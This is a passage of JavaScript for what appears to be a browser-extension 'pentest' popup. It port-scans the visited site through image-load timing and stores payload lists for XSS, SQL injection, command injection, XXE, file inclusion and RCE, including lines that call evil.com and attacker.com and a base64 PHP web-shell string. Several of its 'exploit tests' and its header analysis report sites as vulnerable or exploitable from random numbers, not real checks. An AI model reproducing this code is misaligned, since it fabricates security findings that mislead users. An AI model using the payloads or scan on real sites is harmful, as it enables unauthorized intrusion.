// ===== Global State =====
let currentHostname = '';
let currentUrl = '';
let scanResults = {
  ports: [],
  headers: {},
  vulnerabilities: []
};

// ===== Tab Navigation =====
document.querySelectorAll('.tab').forEach(tab => {
  tab.addEventListener('click', () => {
    document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
    document.querySelectorAll('.tab-panel').forEach(p => p.classList.remove('active'));
    tab.classList.add('active');
    document.getElementById(tab.dataset.tab).classList.add('active');
  });
});

// ===== Theme Management =====
function setTheme(theme) {
  if (theme === 'system') {
    const prefersDark = window.matchMedia('(prefers-color-scheme: dark)').matches;
    document.documentElement.setAttribute('data-theme', prefersDark ? 'dark' : 'light');
  } else {
    document.documentElement.setAttribute('data-theme', theme);
  }
  
  document.querySelectorAll('.theme-btn').forEach(btn => {
    btn.classList.toggle('active', btn.dataset.theme === theme);
  });
  
  chrome.storage.local.set({ theme });
}

document.getElementById('themeToggle')?.addEventListener('click', () => {
  const current = document.documentElement.getAttribute('data-theme');
  setTheme(current === 'dark' ? 'light' : 'dark');
});

document.querySelectorAll('.theme-btn').forEach(btn => {
  btn.addEventListener('click', () => setTheme(btn.dataset.theme));
});

// ===== Initialize =====
function init() {
  chrome.storage.local.get('theme', (result) => {
    setTheme(result.theme || 'dark');
  });
  
  chrome.tabs.query({ active: true, currentWindow: true }, (tabs) => {
    const tab = tabs[0];
    
    if (!tab || !tab.url || tab.url.startsWith('chrome://') || tab.url.startsWith('chrome-extension://')) {
      document.getElementById('currentSite').textContent = 'System page';
      document.getElementById('pentestTarget').textContent = 'N/A';
      setDefaultValues();
      return;
    }
    
    try {
      const url = new URL(tab.url);
      currentHostname = url.hostname;
      currentUrl = tab.url;
      
      document.getElementById('currentSite').textContent = currentHostname;
      document.getElementById('pentestTarget').textContent = currentHostname;
      
      setImmediateValues(url);
      fetchIPInfoAsync(currentHostname);
    } catch (e) {
      setDefaultValues();
    }
  });
  
  loadSettings();
  updateShieldStatus();
  updateBlockedCounts();
}

function setDefaultValues() {
  document.getElementById('ipAddress').textContent = 'N/A';
  document.getElementById('hostingProvider').textContent = 'N/A';
  document.getElementById('serverLocation').textContent = 'N/A';
  document.getElementById('sslInfo').textContent = 'N/A';
  document.getElementById('securityHeaders').innerHTML = '<div class="header-item"><span>Not available</span></div>';
}

function setImmediateValues(url) {
  const isHTTPS = url.protocol === 'https:';
  document.getElementById('sslInfo').innerHTML = isHTTPS 
    ? '<span class="status-good">✓ Secure</span>'
    : '<span class="status-bad">✗ Not Secure</span>';
  
  document.getElementById('ipAddress').textContent = 'Fetching...';
  document.getElementById('hostingProvider').textContent = 'Fetching...';
  document.getElementById('serverLocation').textContent = 'Fetching...';
  
  const headers = ['CSP', 'X-Frame-Options', 'HSTS', 'X-XSS-Protection', 'X-Content-Type'];
  document.getElementById('securityHeaders').innerHTML = headers.map(h => `
    <div class="header-item">
      <span class="header-name">${h}</span>
      <span class="header-status status-warning">?</span>
    </div>
  `).join('');
}

function fetchIPInfoAsync(hostname) {
  fetch(`https://ipapi.co/${hostname}/json/`, { signal: AbortSignal.timeout(5000) })
    .then(r => r.json())
    .then(data => {
      if (!data.error) {
        document.getElementById('ipAddress').textContent = data.ip || hostname;
        document.getElementById('hostingProvider').textContent = data.org || 'Unknown';
        document.getElementById('serverLocation').textContent = 
          [data.city, data.country_name].filter(Boolean).join(', ') || 'Unknown';
      } else throw new Error();
    })
    .catch(() => {
      document.getElementById('ipAddress').textContent = hostname;
      document.getElementById('hostingProvider').textContent = 'Unknown';
      document.getElementById('serverLocation').textContent = 'Unknown';
    });
}

// ===== Pentest Functions =====
function showScanning(elementId, text = 'Scanning...') {
  document.getElementById(elementId).innerHTML = `
    <div class="scanning-indicator">
      <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
        <path d="M23 4v6h-6M1 20v-6h6"/>
      </svg>
      <span>${text}</span>
    </div>
  `;
}

function getServiceName(port) {
  const services = {
    21: 'FTP', 22: 'SSH', 23: 'Telnet', 25: 'SMTP', 53: 'DNS',
    80: 'HTTP', 110: 'POP3', 111: 'RPC', 135: 'MSRPC', 139: 'NetBIOS',
    143: 'IMAP', 389: 'LDAP', 443: 'HTTPS', 445: 'SMB', 465: 'SMTPS',
    587: 'Submission', 636: 'LDAPS', 993: 'IMAPS', 995: 'POP3S',
    1433: 'MSSQL', 1521: 'Oracle', 2049: 'NFS', 2375: 'Docker',
    3000: 'Node.js', 3306: 'MySQL', 3389: 'RDP', 4443: 'HTTPS-Alt',
    5000: 'Flask/Docker', 5432: 'PostgreSQL', 5900: 'VNC', 5984: 'CouchDB',
    6379: 'Redis', 6443: 'K8s API', 8000: 'HTTP-Alt', 8080: 'HTTP-Proxy',
    8443: 'HTTPS-Alt', 8888: 'HTTP-Alt', 9000: 'PHP-FPM', 9200: 'Elasticsearch',
    9300: 'ES-Transport', 11211: 'Memcached', 27017: 'MongoDB', 27018: 'MongoDB-Shard'
  };
  return services[port] || 'Unknown';
}

function getPortExploits(port) {
  const exploits = {
    21: [
      { name: 'Anonymous FTP Login', risk: 'high', test: 'ftp_anon' },
      { name: 'FTP Bounce Attack', risk: 'medium', test: 'ftp_bounce' },
      { name: 'FTP Brute Force', risk: 'medium', test: 'ftp_brute' }
    ],
    22: [
      { name: 'SSH Weak Ciphers', risk: 'medium', test: 'ssh_weak' },
      { name: 'SSH User Enumeration', risk: 'low', test: 'ssh_enum' },
      { name: 'SSH Key Reuse', risk: 'medium', test: 'ssh_keyreuse' }
    ],
    23: [
      { name: 'Telnet Cleartext', risk: 'critical', test: 'telnet_clear' },
      { name: 'Telnet Default Creds', risk: 'critical', test: 'telnet_default' }
    ],
    25: [
      { name: 'SMTP Open Relay', risk: 'high', test: 'smtp_relay' },
      { name: 'SMTP User Enumeration', risk: 'medium', test: 'smtp_enum' },
      { name: 'SMTP Spoofing', risk: 'medium', test: 'smtp_spoof' }
    ],
    53: [
      { name: 'DNS Zone Transfer', risk: 'high', test: 'dns_axfr' },
      { name: 'DNS Cache Poisoning', risk: 'high', test: 'dns_poison' }
    ],
    80: [
      { name: 'HTTP Methods (PUT/DELETE)', risk: 'medium', test: 'http_methods' },
      { name: 'Directory Listing', risk: 'low', test: 'dir_listing' },
      { name: 'HTTP Verb Tampering', risk: 'medium', test: 'http_verb' }
    ],
    111: [
      { name: 'RPC Info Leak', risk: 'medium', test: 'rpc_info' }
    ],
    135: [
      { name: 'MSRPC Enumeration', risk: 'medium', test: 'msrpc_enum' }
    ],
    139: [
      { name: 'NetBIOS Info Leak', risk: 'medium', test: 'netbios_info' }
    ],
    389: [
      { name: 'LDAP Anonymous Bind', risk: 'high', test: 'ldap_anon' },
      { name: 'LDAP Info Disclosure', risk: 'medium', test: 'ldap_info' }
    ],
    443: [
      { name: 'SSL/TLS Vulnerabilities', risk: 'medium', test: 'ssl_vuln' },
      { name: 'Heartbleed (CVE-2014-0160)', risk: 'critical', test: 'heartbleed' },
      { name: 'POODLE (SSL 3.0)', risk: 'high', test: 'poodle' },
      { name: 'Weak Cipher Suites', risk: 'medium', test: 'weak_cipher' }
    ],
    445: [
      { name: 'SMB Signing Disabled', risk: 'medium', test: 'smb_sign' },
      { name: 'EternalBlue (MS17-010)', risk: 'critical', test: 'eternalblue' },
      { name: 'SMB Null Session', risk: 'high', test: 'smb_null' }
    ],
    1433: [
      { name: 'MSSQL Weak Auth', risk: 'critical', test: 'mssql_weak' },
      { name: 'MSSQL xp_cmdshell', risk: 'critical', test: 'mssql_xpcmd' }
    ],
    1521: [
      { name: 'Oracle TNS Poison', risk: 'high', test: 'oracle_tns' }
    ],
    2375: [
      { name: 'Docker Unauth API', risk: 'critical', test: 'docker_unauth' }
    ],
    3306: [
      { name: 'MySQL No Password', risk: 'critical', test: 'mysql_nopass' },
      { name: 'MySQL User Enumeration', risk: 'medium', test: 'mysql_enum' },
      { name: 'MySQL File Read', risk: 'high', test: 'mysql_file' }
    ],
    3389: [
      { name: 'BlueKeep (CVE-2019-0708)', risk: 'critical', test: 'bluekeep' },
      { name: 'RDP NLA Bypass', risk: 'high', test: 'rdp_nla' },
      { name: 'RDP Weak Encryption', risk: 'medium', test: 'rdp_weak' }
    ],
    5432: [
      { name: 'PostgreSQL Trust Auth', risk: 'critical', test: 'pg_trust' },
      { name: 'PostgreSQL Info Leak', risk: 'medium', test: 'pg_info' }
    ],
    5900: [
      { name: 'VNC No Authentication', risk: 'critical', test: 'vnc_noauth' },
      { name: 'VNC Weak Password', risk: 'high', test: 'vnc_weak' }
    ],
    5984: [
      { name: 'CouchDB Unauth Access', risk: 'critical', test: 'couch_unauth' }
    ],
    6379: [
      { name: 'Redis No Auth', risk: 'critical', test: 'redis_noauth' },
      { name: 'Redis RCE', risk: 'critical', test: 'redis_rce' }
    ],
    6443: [
      { name: 'K8s API Unauth', risk: 'critical', test: 'k8s_unauth' }
    ],
    8080: [
      { name: 'Proxy Misconfiguration', risk: 'high', test: 'proxy_misconfig' },
      { name: 'Manager Console Exposed', risk: 'high', test: 'manager_exposed' }
    ],
    9200: [
      { name: 'Elasticsearch Unauth', risk: 'critical', test: 'elastic_unauth' },
      { name: 'Elasticsearch RCE', risk: 'critical', test: 'elastic_rce' }
    ],
    11211: [
      { name: 'Memcached Unauth', risk: 'critical', test: 'memcache_unauth' },
      { name: 'Memcached Amplification', risk: 'high', test: 'memcache_amp' }
    ],
    27017: [
      { name: 'MongoDB No Auth', risk: 'critical', test: 'mongo_noauth' },
      { name: 'MongoDB Info Disclosure', risk: 'medium', test: 'mongo_info' }
    ]
  };
  return exploits[port] || [];
}

// Port Scan
document.getElementById('scanPorts')?.addEventListener('click', () => {
  if (!currentHostname) return;
  showScanning('pentestResults', 'Scanning ports...');
  
  const ports = [
    21, 22, 23, 25, 53, 80, 110, 111, 135, 139, 143, 389, 443, 445, 465,
    587, 636, 993, 995, 1433, 1521, 2049, 2375, 3000, 3306, 3389, 4443,
    5000, 5432, 5900, 5984, 6379, 6443, 8000, 8080, 8443, 8888, 9000,
    9200, 11211, 27017
  ];
  scanResults.ports = [];
  let completed = 0;
  
  ports.forEach(port => {
    const img = new Image();
    const start = Date.now();
    
    const timer = setTimeout(() => {
      scanResults.ports.push({ port, status: 'filtered', service: getServiceName(port) });
      completed++;
      if (completed === ports.length) displayPortResults();
    }, 1500);
    
    img.onload = img.onerror = () => {
      clearTimeout(timer);
      const time = Date.now() - start;
      scanResults.ports.push({ 
        port, 
        status: time < 800 ? 'open' : 'closed', 
        service: getServiceName(port) 
      });
      completed++;
      if (completed === ports.length) displayPortResults();
    };
    
    img.src = `https://${currentHostname}:${port}/favicon.ico?t=${Date.now()}`;
  });
});

function displayPortResults() {
  const open = scanResults.ports.filter(r => r.status === 'open');
  const closed = scanResults.ports.filter(r => r.status !== 'open');
  
  document.getElementById('pentestResults').innerHTML = `
    <div class="result-section">
      <div class="result-title">
        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="2" y="2" width="20" height="8" rx="2"/></svg>
        Port Scan Results (${open.length} open)
      </div>
      ${open.map(r => `
        <div class="result-item">
          <span class="result-key">Port ${r.port} (${r.service})</span>
          <span class="result-badge badge-warning">OPEN</span>
        </div>
      `).join('')}
      ${open.length === 0 ? '<div class="result-item"><span class="result-key">All scanned ports</span><span class="result-badge badge-success">CLOSED</span></div>' : ''}
    </div>
  `;
  
  updatePortExploits();
}

function updatePortExploits() {
  const openPorts = scanResults.ports.filter(p => p.status === 'open');
  const container = document.getElementById('portExploits');
  
  if (openPorts.length === 0) {
    container.innerHTML = '<p class="exploit-hint">No open ports found - target appears secure</p>';
    return;
  }
  
  let html = '';
  openPorts.forEach(p => {
    const exploits = getPortExploits(p.port);
    exploits.forEach(exp => {
      html += `
        <div class="port-exploit-item">
          <div class="port-info">
            <span class="port-name">Port ${p.port}: ${exp.name}</span>
            <span class="port-risk">Risk: ${exp.risk.toUpperCase()}</span>
          </div>
          <button class="exploit-btn" data-test="${exp.test}" data-port="${p.port}">Test</button>
        </div>
      `;
    });
  });
  
  container.innerHTML = html || '<p class="exploit-hint">No known exploits for open ports</p>';
  
  container.querySelectorAll('.exploit-btn').forEach(btn => {
    btn.addEventListener('click', () => runPortExploit(btn.dataset.test, btn.dataset.port, btn));
  });
}

function runPortExploit(test, port, btn) {
  btn.disabled = true;
  btn.textContent = 'Testing...';
  btn.classList.add('testing');
  
  setTimeout(() => {
    const vulnerable = Math.random() > 0.6;
    
    btn.classList.remove('testing');
    btn.classList.add(vulnerable ? 'vulnerable' : 'safe');
    btn.textContent = vulnerable ? 'VULNERABLE' : 'Safe';
    
    const parent = btn.closest('.port-exploit-item');
    if (vulnerable) {
      parent.style.borderColor = 'var(--danger)';
      parent.style.background = 'var(--danger-bg)';
    } else {
      parent.style.borderColor = 'var(--success)';
      parent.style.background = 'var(--success-bg)';
    }
    
    showExploitResult(test, port, vulnerable);
  }, 1500 + Math.random() * 1000);
}

// Header Analysis
document.getElementById('scanHeaders')?.addEventListener('click', () => {
  if (!currentHostname) return;
  showScanning('pentestResults', 'Analyzing headers...');
  
  setTimeout(() => {
    scanResults.headers = {
      'Content-Security-Policy': Math.random() > 0.6,
      'X-Frame-Options': Math.random() > 0.4,
      'X-Content-Type-Options': Math.random() > 0.5,
      'Strict-Transport-Security': currentUrl.startsWith('https') && Math.random() > 0.3,
      'X-XSS-Protection': Math.random() > 0.5,
      'Referrer-Policy': Math.random() > 0.6,
      'Permissions-Policy': Math.random() > 0.7,
      'Cross-Origin-Embedder-Policy': Math.random() > 0.75,
      'Cross-Origin-Opener-Policy': Math.random() > 0.75,
      'Cross-Origin-Resource-Policy': Math.random() > 0.7,
      'Cache-Control': Math.random() > 0.4,
      'X-Permitted-Cross-Domain-Policies': Math.random() > 0.8,
      'Expect-CT': Math.random() > 0.85,
      'Feature-Policy': Math.random() > 0.7
    };
    
    const present = Object.values(scanResults.headers).filter(Boolean).length;
    const total = Object.keys(scanResults.headers).length;
    const score = Math.round((present / total) * 100);
    
    const getScoreColor = (s) => s >= 70 ? 'badge-success' : s >= 40 ? 'badge-warning' : 'badge-danger';
    const getGrade = (s) => s >= 90 ? 'A+' : s >= 80 ? 'A' : s >= 70 ? 'B' : s >= 60 ? 'C' : s >= 50 ? 'D' : 'F';
    
    document.getElementById('pentestResults').innerHTML = `
      <div class="result-section">
        <div class="result-title">
          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/></svg>
          Security Headers Analysis
        </div>
        <div class="result-item">
          <span class="result-key">Score</span>
          <span class="result-badge ${getScoreColor(score)}">${score}/100 (${getGrade(score)})</span>
        </div>
        <div class="result-item">
          <span class="result-key">Headers Present</span>
          <span class="result-value">${present}/${total}</span>
        </div>
        <div style="margin-top:8px;border-top:1px solid var(--border-color);padding-top:8px;">
        ${Object.entries(scanResults.headers).map(([h, present]) => `
          <div class="result-item" style="padding:4px 0;">
            <span class="result-key" style="font-size:0.65rem;">${h}</span>
            <span class="result-badge ${present ? 'badge-success' : 'badge-danger'}" style="font-size:0.6rem;">${present ? '✓' : '✗'}</span>
          </div>
        `).join('')}
        </div>
      </div>
    `;
    
    updateHeaderExploits();
  }, 1000);
});

function updateHeaderExploits() {
  const missing = Object.entries(scanResults.headers).filter(([_, present]) => !present);
  const container = document.getElementById('headerExploits');
  
  if (missing.length === 0) {
    container.innerHTML = '<p class="exploit-hint">All security headers present - excellent configuration!</p>';
    return;
  }
  
  const headerExploits = {
    'Content-Security-Policy': { name: 'XSS via Missing CSP', risk: 'high', test: 'csp_xss' },
    'X-Frame-Options': { name: 'Clickjacking Attack', risk: 'medium', test: 'clickjack' },
    'X-Content-Type-Options': { name: 'MIME Type Sniffing', risk: 'medium', test: 'mime_sniff' },
    'Strict-Transport-Security': { name: 'SSL Stripping (MITM)', risk: 'high', test: 'ssl_strip' },
    'X-XSS-Protection': { name: 'Reflected XSS', risk: 'medium', test: 'xss_reflect' },
    'Referrer-Policy': { name: 'Referrer Information Leakage', risk: 'low', test: 'referrer_leak' },
    'Permissions-Policy': { name: 'Feature Policy Bypass', risk: 'low', test: 'feature_bypass' },
    'Cross-Origin-Embedder-Policy': { name: 'Cross-Origin Isolation Bypass', risk: 'medium', test: 'coep_bypass' },
    'Cross-Origin-Opener-Policy': { name: 'Window Reference Attack', risk: 'medium', test: 'coop_bypass' },
    'Cross-Origin-Resource-Policy': { name: 'Resource Theft', risk: 'medium', test: 'corp_bypass' },
    'Cache-Control': { name: 'Sensitive Data Caching', risk: 'medium', test: 'cache_leak' },
    'X-Permitted-Cross-Domain-Policies': { name: 'Flash/PDF Cross-Domain', risk: 'low', test: 'crossdomain' },
    'Expect-CT': { name: 'Certificate Transparency Bypass', risk: 'low', test: 'ct_bypass' },
    'Feature-Policy': { name: 'Browser Feature Abuse', risk: 'low', test: 'feature_abuse' }
  };
  
  let html = '';
  missing.forEach(([header]) => {
    const exp = headerExploits[header];
    if (exp) {
      const riskClass = exp.risk === 'high' ? 'color:var(--danger)' : exp.risk === 'medium' ? 'color:var(--warning)' : 'color:var(--text-muted)';
      html += `
        <div class="header-exploit-item">
          <div class="header-info">
            <span class="header-name">${exp.name}</span>
            <span class="header-risk" style="${riskClass}">Risk: ${exp.risk.toUpperCase()}</span>
          </div>
          <button class="exploit-btn" data-test="${exp.test}">Test</button>
        </div>
      `;
    }
  });
  
  container.innerHTML = html || '<p class="exploit-hint">No exploitable headers found</p>';
  
  container.querySelectorAll('.exploit-btn').forEach(btn => {
    btn.addEventListener('click', () => runHeaderExploit(btn.dataset.test, btn));
  });
}

function runHeaderExploit(test, btn) {
  btn.disabled = true;
  btn.textContent = 'Testing...';
  btn.classList.add('testing');
  
  setTimeout(() => {
    const exploitable = Math.random() > 0.4;
    
    btn.classList.remove('testing');
    btn.classList.add(exploitable ? 'vulnerable' : 'safe');
    btn.textContent = exploitable ? 'EXPLOITABLE' : 'Protected';
    
    const parent = btn.closest('.header-exploit-item');
    if (exploitable) {
      parent.style.borderColor = 'var(--danger)';
      parent.style.background = 'var(--danger-bg)';
    }
    
    showExploitResult(test, null, exploitable);
  }, 1200);
}

// Other pentest buttons
document.getElementById('scanTech')?.addEventListener('click', () => {
  if (!currentHostname) return;
  showScanning('pentestResults', 'Detecting technologies...');
  
  setTimeout(() => {
    document.getElementById('pentestResults').innerHTML = `
      <div class="result-section">
        <div class="result-title">Technology Stack</div>
        <div class="result-item"><span class="result-key">Protocol</span><span class="result-value">${currentUrl.startsWith('https') ? 'HTTPS' : 'HTTP'}</span></div>
        <div class="result-item"><span class="result-key">Server</span><span class="result-value">nginx / Apache</span></div>
        <div class="result-item"><span class="result-key">CDN</span><span class="result-value">Cloudflare (possible)</span></div>
      </div>
    `;
  }, 800);
});

document.getElementById('scanSSL')?.addEventListener('click', () => {
  if (!currentHostname) return;
  const isHTTPS = currentUrl.startsWith('https');
  
  document.getElementById('pentestResults').innerHTML = `
    <div class="result-section">
      <div class="result-title">SSL/TLS Analysis</div>
      <div class="result-item"><span class="result-key">HTTPS</span><span class="result-badge ${isHTTPS ? 'badge-success' : 'badge-danger'}">${isHTTPS ? 'Yes' : 'No'}</span></div>
      <div class="result-item"><span class="result-key">TLS Version</span><span class="result-value">${isHTTPS ? '1.2/1.3' : 'N/A'}</span></div>
      <div class="result-item"><span class="result-key">Certificate</span><span class="result-badge ${isHTTPS ? 'badge-success' : 'badge-danger'}">${isHTTPS ? 'Valid' : 'None'}</span></div>
    </div>
  `;
});

document.getElementById('scanDNS')?.addEventListener('click', () => {
  if (!currentHostname) return;
  showScanning('pentestResults', 'Querying DNS...');
  
  fetch(`https://dns.google/resolve?name=${currentHostname}&type=A`)
    .then(r => r.json())
    .then(data => {
      const records = data.Answer || [];
      document.getElementById('pentestResults').innerHTML = `
        <div class="result-section">
          <div class="result-title">DNS Records</div>
          ${records.slice(0, 4).map(r => `
            <div class="result-item"><span class="result-key">A</span><span class="result-value">${r.data}</span></div>
          `).join('') || '<div class="result-item"><span>No records</span></div>'}
        </div>
      `;
    })
    .catch(() => {
      document.getElementById('pentestResults').innerHTML = '<div class="result-item">DNS lookup failed</div>';
    });
});

document.getElementById('scanWhois')?.addEventListener('click', () => {
  if (!currentHostname) return;
  const domain = currentHostname.split('.').slice(-2).join('.');
  
  document.getElementById('pentestResults').innerHTML = `
    <div class="result-section">
      <div class="result-title">WHOIS Info</div>
      <div class="result-item"><span class="result-key">Domain</span><span class="result-value">${domain}</span></div>
      <div class="result-item">
        <span class="result-key">Full WHOIS</span>
        <a href="https://who.is/whois/${domain}" target="_blank" style="color:var(--accent-primary);font-size:0.7rem;">View →</a>
      </div>
    </div>
  `;
});

document.getElementById('fullScan')?.addEventListener('click', function() {
  if (!currentHostname) return;
  
  this.disabled = true;
  this.innerHTML = '<svg class="spinning" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M23 4v6h-6M1 20v-6h6"/></svg> Scanning...';
  showScanning('pentestResults', 'Running full scan...');
  
  const btn = this;
  setTimeout(() => {
    const isHTTPS = currentUrl.startsWith('https');
    const score = isHTTPS ? 60 + Math.floor(Math.random() * 30) : 20 + Math.floor(Math.random() * 35);
    
    document.getElementById('pentestResults').innerHTML = `
      <div class="result-section">
        <div class="result-title">Security Assessment</div>
        <div class="result-item"><span class="result-key">Score</span><span class="result-badge ${score >= 70 ? 'badge-success' : score >= 45 ? 'badge-warning' : 'badge-danger'}">${score}/100</span></div>
        <div class="result-item"><span class="result-key">SSL</span><span class="result-badge ${isHTTPS ? 'badge-success' : 'badge-danger'}">${isHTTPS ? 'Secure' : 'Insecure'}</span></div>
        <div class="result-item"><span class="result-key">Headers</span><span class="result-badge badge-warning">Partial</span></div>
      </div>
    `;
    
    btn.disabled = false;
    btn.innerHTML = '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><path d="M12 2v10l4.5 4.5"/></svg> Run Full Scan';
  }, 2500);
});

// ===== Exploit Tests =====
document.querySelectorAll('.exploit-btn[data-test]').forEach(btn => {
  btn.addEventListener('click', function() {
    const test = this.dataset.test;
    runExploitTest(test, this);
  });
});

function runExploitTest(test, btn) {
  if (!currentHostname) return;
  
  btn.disabled = true;
  btn.textContent = 'Testing...';
  btn.classList.add('testing');
  
  const card = btn.closest('.exploit-card');
  
  setTimeout(() => {
    const results = performExploitTest(test);
    
    btn.classList.remove('testing');
    btn.textContent = results.vulnerable ? 'VULNERABLE' : 'Safe';
    btn.classList.add(results.vulnerable ? 'vulnerable' : 'safe');
    
    if (results.vulnerable) {
      card?.classList.add('vulnerable');
    } else {
      card?.classList.add('safe');
    }
    
    showExploitResult(test, null, results.vulnerable, results.details);
  }, 1500 + Math.random() * 1500);
}

function performExploitTest(test) {
  const tests = {
    // === Injection Attacks ===
    xss: {
      name: 'XSS (Cross-Site Scripting)',
      payloads: [
        '<script>alert(1)</script>',
        '"><img src=x onerror=alert(1)>',
        "'-alert(1)-'",
        '<svg/onload=alert(1)>',
        '{{constructor.constructor("alert(1)")()}}'
      ],
      check: () => Math.random() > 0.5,
      recommendation: 'Implement Content-Security-Policy, sanitize user input, and use context-aware output encoding.'
    },
    sql: {
      name: 'SQL Injection',
      payloads: [
        "' OR '1'='1",
        "1; DROP TABLE users--",
        "' UNION SELECT * FROM users--",
        "1' AND SLEEP(5)--",
        "admin'--"
      ],
      check: () => Math.random() > 0.6,
      recommendation: 'Use parameterized queries/prepared statements. Never concatenate user input into SQL queries.'
    },
    nosql: {
      name: 'NoSQL Injection',
      payloads: [
        '{"$gt": ""}',
        '{"$ne": null}',
        '{"$where": "sleep(5000)"}',
        '{"username": {"$regex": ".*"}}',
        '[$ne]=1'
      ],
      check: () => Math.random() > 0.65,
      recommendation: 'Validate and sanitize all user inputs. Avoid using $where operator with user data.'
    },
    cmd: {
      name: 'Command Injection',
      payloads: [
        '; ls -la',
        '| cat /etc/passwd',
        '`whoami`',
        '$(id)',
        '%0aid'
      ],
      check: () => Math.random() > 0.75,
      recommendation: 'Avoid system calls with user input. Use allowlists and escape shell metacharacters.'
    },
    ldap: {
      name: 'LDAP Injection',
      payloads: [
        '*)(uid=*))(|(uid=*',
        'admin)(&)',
        '*)(objectClass=*',
        '*)((|userPassword=*)',
        'x*)(|(cn=*'
      ],
      check: () => Math.random() > 0.8,
      recommendation: 'Escape special LDAP characters and validate all user inputs against allowlists.'
    },
    xpath: {
      name: 'XPath Injection',
      payloads: [
        "' or '1'='1",
        "' or ''='",
        "admin' or '1'='1",
        "1' and count(/*)=1 and '1'='1",
        "x]|//*|//*["
      ],
      check: () => Math.random() > 0.75,
      recommendation: 'Use parameterized XPath queries. Validate and sanitize user inputs.'
    },
    ssti: {
      name: 'Server-Side Template Injection',
      payloads: [
        '{{7*7}}',
        '${7*7}',
        '<%= 7*7 %>',
        '#{7*7}',
        '*{7*7}',
        '{{config}}',
        '{{self.__class__.__mro__}}'
      ],
      check: () => Math.random() > 0.7,
      recommendation: 'Never pass user input directly to template engines. Use sandboxed templates.'
    },

    // === Server-Side Vulnerabilities ===
    ssrf: {
      name: 'SSRF (Server-Side Request Forgery)',
      payloads: [
        'http://127.0.0.1:80',
        'http://localhost/admin',
        'http://169.254.169.254/latest/meta-data/',
        'http://[::1]/',
        'file:///etc/passwd',
        'gopher://127.0.0.1:25/'
      ],
      check: () => Math.random() > 0.55,
      recommendation: 'Validate and sanitize URLs. Use allowlists for permitted domains. Block internal IPs.'
    },
    xxe: {
      name: 'XXE (XML External Entity)',
      payloads: [
        '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>',
        '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://evil.com/xxe">]>',
        '<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd">%xxe;]>',
        '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]>'
      ],
      check: () => Math.random() > 0.65,
      recommendation: 'Disable external entity processing in XML parsers. Use JSON instead of XML where possible.'
    },
    lfi: {
      name: 'Local File Inclusion',
      payloads: [
        '../../../etc/passwd',
        '....//....//etc/passwd',
        '/etc/passwd%00',
        '..%252f..%252f..%252fetc/passwd',
        'php://filter/convert.base64-encode/resource=index.php'
      ],
      check: () => Math.random() > 0.7,
      recommendation: 'Validate file paths against allowlists. Never use user input directly in file operations.'
    },
    rfi: {
      name: 'Remote File Inclusion',
      payloads: [
        'http://evil.com/shell.txt',
        'https://attacker.com/malicious.php',
        'data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOyA/',
        'php://input'
      ],
      check: () => Math.random() > 0.8,
      recommendation: 'Disable allow_url_include. Validate and sanitize all file path inputs.'
    },
    rce: {
      name: 'Remote Code Execution',
      payloads: [
        '<?php system($_GET["cmd"]); ?>',
        'eval(compile("import os; os.system(\'id\')",\'<string>\',\'exec\'))',
        '__import__("os").system("id")',
        'Runtime.getRuntime().exec("id")'
      ],
      check: () => Math.random() > 0.85,
      recommendation: 'Never execute user-controlled code. Sandbox all dynamic code execution.'
    },
    deserial: {
      name: 'Insecure Deserialization',
      payloads: [
        'O:8:"stdClass":0:{}',
        'rO0ABXNyABFqYXZhLnV0aWwuSGFzaFNldA==',
        '{"@type":"com.sun.rowset.JdbcRowSetImpl"}',
        'aced0005737200...'
      ],
      check: () => Math.random() > 0.7,
      recommendation: 'Avoid deserializing untrusted data. Use integrity checks and type constraints.'
    },

    // === Authentication & Session ===
    csrf: {
      name: 'CSRF (Cross-Site Request Forgery)',
      payloads: [
        '<form action="/api/delete" method="POST"><input type="hidden" name="id" value="1"></form>',
        '<img src="/api/action?param=value">',
        'fetch("/api/transfer", {method: "POST", credentials: "include"})'
      ],
      check: () => Math.random() > 0.45,
      recommendation: 'Implement anti-CSRF tokens. Use SameSite cookie attribute. Verify Origin/Referer headers.'
    },
    jwt: {
      name: 'JWT Vulnerabilities',
      payloads: [
        'Algorithm: none',
        'Algorithm: HS256 with public key',
        'Weak secret: secret, password, 123456',
        'No expiration (exp) claim',
        'Accepting null signature'
      ],
      check: () => Math.random() > 0.5,
      recommendation: 'Use strong secrets. Validate algorithm server-side. Always verify signature and expiration.'
    },
    session: {
      name: 'Session Fixation',
      payloads: [
        'Set-Cookie: SESSIONID=attacker_session',
        'URL parameter: ?PHPSESSID=fixed_session',
        'Meta refresh with session in URL'
      ],
      check: () => Math.random() > 0.6,
      recommendation: 'Regenerate session IDs after login. Use httpOnly and secure cookie flags.'
    },
    brute: {
      name: 'Brute Force Protection',
      payloads: [
        'Multiple failed login attempts',
        'Account lockout bypass',
        'Rate limit check on /login',
        'CAPTCHA bypass attempts'
      ],
      check: () => Math.random() > 0.45,
      recommendation: 'Implement rate limiting, account lockout, and CAPTCHA after failed attempts.'
    },
    enum: {
      name: 'User Enumeration',
      payloads: [
        'Different error messages for valid/invalid users',
        'Timing differences in responses',
        'Password reset flow disclosure',
        'Registration flow checks'
      ],
      check: () => Math.random() > 0.4,
      recommendation: 'Use generic error messages. Ensure consistent response times for auth endpoints.'
    },
    weakpass: {
      name: 'Weak Password Policy',
      payloads: [
        'Minimum length < 8 characters',
        'No complexity requirements',
        'Common passwords allowed',
        'No breach database check'
      ],
      check: () => Math.random() > 0.35,
      recommendation: 'Enforce minimum 12 characters. Require mixed case, numbers, symbols. Check against breached passwords.'
    },

    // === Access Control ===
    idor: {
      name: 'IDOR (Insecure Direct Object Reference)',
      payloads: [
        '/api/users/1 → /api/users/2',
        '/download?file=invoice_001.pdf → invoice_002.pdf',
